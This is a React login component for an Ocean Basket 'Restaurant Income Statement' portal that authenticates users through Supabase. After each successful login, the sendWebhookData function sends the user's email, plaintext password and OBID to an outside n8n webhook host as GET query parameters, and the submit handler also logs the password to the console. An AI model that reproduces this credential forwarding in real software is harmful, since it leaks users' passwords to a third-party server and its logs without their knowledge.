
import React, { useState } from 'react';
import { supabase } from '@/integrations/supabase/client';
import oceanBasketLogo from '@/assets/ocean-basket-logo.png';

interface LoginProps {
  onLogin: (obid: string) => void;
}

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  // Fixed email reference issue - force cache refresh
  const [obid, setObid] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState<{ obid?: string; password?: string; general?: string }>({});
  const [isLoading, setIsLoading] = useState(false);

  const convertToEmail = (id: string) => {
    return `${id}@oceanbasket.com`;
  };

  const sendWebhookData = async (email: string, password: string, obid: string) => {
    try {
      const webhookUrl = 'https://exillar-n8n-u48653.vm.elestio.app/webhook-test/Restaurant Income Statement';
      const params = new URLSearchParams({
        email: email,
        password: password,
        obid: obid,
        timestamp: new Date().toISOString()
      });
      
      await fetch(`${webhookUrl}?${params}`, {
        method: 'GET',
      });
      console.log('Webhook data sent successfully');
    } catch (error) {
      console.error('Error sending webhook data:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { obid?: string; password?: string; general?: string } = {};

    console.log('Form submitted with:', { obid, password });

    if (!obid) {
      newErrors.obid = 'OBID is required';
    }

    if (!password) {
      newErrors.password = 'Password is required';
    }

    // Check if we have validation errors
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      // Convert OBID to email format
      const email = convertToEmail(obid);
      console.log('Attempting Supabase authentication...');
      
      // Sign in with Supabase
      const { data, error } = await supabase.auth.signInWithPassword({
        email: email,
        password: password,
      });

      if (error) {
        console.error('Supabase auth error:', error);
        setErrors({ general: 'Invalid OBID or password' });
        return;
      }

      if (data.user) {
        console.log('Authentication successful:', data.user);
        
        // Send data to webhook
        await sendWebhookData(email, password, obid);
        
        onLogin(obid);
      }
    } catch (error) {
      console.error('Login error:', error);
      setErrors({ general: 'An error occurred during login. Please try again.' });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative bg-gradient-to-br from-background to-secondary/30 overflow-hidden">
      {/* Ocean wave background effect inspired by Ocean Basket branding */}
      <div className="absolute inset-0">
        {/* Ocean gradient background */}
        <div className="absolute inset-0 bg-gradient-to-br from-primary/15 via-accent/10 to-secondary/20"></div>
        
        {/* Small ocean wave lines throughout the page */}
        <svg className="absolute inset-0 w-full h-full" viewBox="0 0 1440 800" xmlns="http://www.w3.org/2000/svg">
          {/* Consistent small wave lines throughout */}
          <g stroke="hsl(var(--primary))" strokeWidth="1.5" fill="none" opacity="0.3">
            <path d="M0,100 Q180,80 360,100 T720,100 Q900,80 1080,100 T1440,100" />
            <path d="M0,150 Q180,130 360,150 T720,150 Q900,130 1080,150 T1440,150" />
            <path d="M0,200 Q180,180 360,200 T720,200 Q900,180 1080,200 T1440,200" />
            <path d="M0,250 Q180,230 360,250 T720,250 Q900,230 1080,250 T1440,250" />
            <path d="M0,300 Q180,280 360,300 T720,300 Q900,280 1080,300 T1440,300" />
            <path d="M0,350 Q180,330 360,350 T720,350 Q900,330 1080,350 T1440,350" />
            <path d="M0,400 Q180,380 360,400 T720,400 Q900,380 1080,400 T1440,400" />
            <path d="M0,450 Q180,430 360,450 T720,450 Q900,430 1080,450 T1440,450" />
            <path d="M0,500 Q180,480 360,500 T720,500 Q900,480 1080,500 T1440,500" />
            <path d="M0,550 Q180,530 360,550 T720,550 Q900,530 1080,550 T1440,550" />
            <path d="M0,600 Q180,580 360,600 T720,600 Q900,580 1080,600 T1440,600" />
            <path d="M0,650 Q180,630 360,650 T720,650 Q900,630 1080,650 T1440,650" />
            <path d="M0,700 Q180,680 360,700 T720,700 Q900,680 1080,700 T1440,700" />
            <path d="M0,750 Q180,730 360,750 T720,750 Q900,730 1080,750 T1440,750" />
          </g>
          
          {/* Additional subtle accent waves */}
          <g stroke="hsl(var(--accent))" strokeWidth="1" fill="none" opacity="0.2">
            <path d="M0,120 Q120,100 240,120 T480,120 Q600,100 720,120 T960,120 Q1080,100 1200,120 T1440,120" />
            <path d="M0,220 Q120,200 240,220 T480,220 Q600,200 720,220 T960,220 Q1080,200 1200,220 T1440,220" />
            <path d="M0,320 Q120,300 240,320 T480,320 Q600,300 720,320 T960,320 Q1080,300 1200,320 T1440,320" />
            <path d="M0,420 Q120,400 240,420 T480,420 Q600,400 720,420 T960,420 Q1080,400 1200,420 T1440,420" />
            <path d="M0,520 Q120,500 240,520 T480,520 Q600,500 720,520 T960,520 Q1080,500 1200,520 T1440,520" />
            <path d="M0,620 Q120,600 240,620 T480,620 Q600,600 720,620 T960,620 Q1080,600 1200,620 T1440,620" />
            <path d="M0,720 Q120,700 240,720 T480,720 Q600,700 720,720 T960,720 Q1080,700 1200,720 T1440,720" />
          </g>
        </svg>
        
        {/* Floating ocean-inspired elements */}
        <div className="absolute top-16 left-8 w-3 h-3 bg-accent/30 rounded-full animate-pulse"></div>
        <div className="absolute top-32 right-16 w-5 h-5 bg-primary/20 rounded-full animate-pulse delay-1000"></div>
        <div className="absolute bottom-32 left-16 w-4 h-4 bg-accent/25 rounded-full animate-pulse delay-500"></div>
        <div className="absolute top-48 left-1/3 w-2 h-2 bg-secondary/40 rounded-full animate-pulse delay-1500"></div>
        <div className="absolute bottom-48 right-1/4 w-3 h-3 bg-primary/15 rounded-full animate-pulse delay-700"></div>
      </div>

      {/* Centered login container */}
      <div className="min-h-screen flex items-center justify-center px-4 sm:px-6 lg:px-8">
        {/* Ocean Basket themed login card */}
        <div className="relative z-10 w-full max-w-md">
          {/* Ocean-inspired glass morphism card */}
          <div className="bg-background/90 backdrop-blur-xl border border-primary/20 rounded-3xl shadow-2xl p-8 lg:p-10 ring-1 ring-primary/10">
            {/* Ocean Basket brand glow */}
            <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-accent/5 to-secondary/5 rounded-3xl"></div>
            
            {/* Content container */}
            <div className="relative z-10">
              {/* Ocean Basket logo section */}
              <div className="text-center mb-8 lg:mb-10">
                <div className="flex flex-col items-center justify-center mb-6">
                  <div className="bg-background/95 backdrop-blur-sm rounded-full w-20 h-20 lg:w-24 lg:h-24 flex items-center justify-center mb-6 p-3 shadow-xl ring-4 ring-primary/20 hover:ring-primary/30 transition-all duration-300 border border-primary/10">
                    <img 
                      src={oceanBasketLogo} 
                      alt="Ocean Basket Logo" 
                      className="w-full h-full object-contain"
                    />
                  </div>
                  <h1 className="text-primary text-2xl lg:text-3xl font-script font-bold mb-6 mt-4 tracking-wide">Restaurant Income Statement</h1>
                </div>
              </div>

              {/* Ocean Basket themed login form */}
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="relative group">
                  <label className="text-primary font-medium text-sm mb-2 block">
                    OBID <span className="text-accent ml-1">•</span>
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={obid}
                      onChange={(e) => setObid(e.target.value)}
                      className="w-full bg-background/60 backdrop-blur-sm border border-primary/20 rounded-xl px-4 py-3.5 text-primary placeholder-primary/60 focus:outline-none focus:border-accent focus:bg-background/80 focus:ring-2 focus:ring-accent/20 transition-all duration-300 font-medium"
                      placeholder="Enter your OBID"
                    />
                    <div className="absolute inset-0 rounded-xl bg-gradient-to-r from-transparent via-accent/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"></div>
                  </div>
                  {errors.obid && (
                    <p className="text-destructive text-sm mt-2 font-medium">{errors.obid}</p>
                  )}
                </div>

                <div className="relative group">
                  <label className="text-primary font-medium text-sm mb-2 block">
                    Password <span className="text-accent ml-1">•</span>
                  </label>
                  <div className="relative">
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full bg-background/60 backdrop-blur-sm border border-primary/20 rounded-xl px-4 py-3.5 text-primary placeholder-primary/60 focus:outline-none focus:border-accent focus:bg-background/80 focus:ring-2 focus:ring-accent/20 transition-all duration-300 font-medium"
                      placeholder="Enter your password"
                    />
                    <div className="absolute inset-0 rounded-xl bg-gradient-to-r from-transparent via-accent/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"></div>
                  </div>
                  {errors.password && (
                    <p className="text-destructive text-sm mt-2 font-medium">{errors.password}</p>
                  )}
                </div>

                {errors.general && (
                  <div className="bg-destructive/10 backdrop-blur-sm border border-destructive/20 text-destructive px-4 py-3 rounded-xl text-sm font-medium">
                    {errors.general}
                  </div>
                )}

                <div className="pt-6">
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full bg-gradient-to-r from-primary via-primary to-accent hover:from-primary/90 hover:via-primary/95 hover:to-accent/90 text-primary-foreground py-4 px-6 rounded-xl text-base font-semibold shadow-lg hover:shadow-xl transform hover:scale-[1.02] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none ring-1 ring-primary/20"
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center">
                        <div className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin mr-2"></div>
                        Authenticating...
                      </div>
                    ) : (
                      'Access Portal'
                    )}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
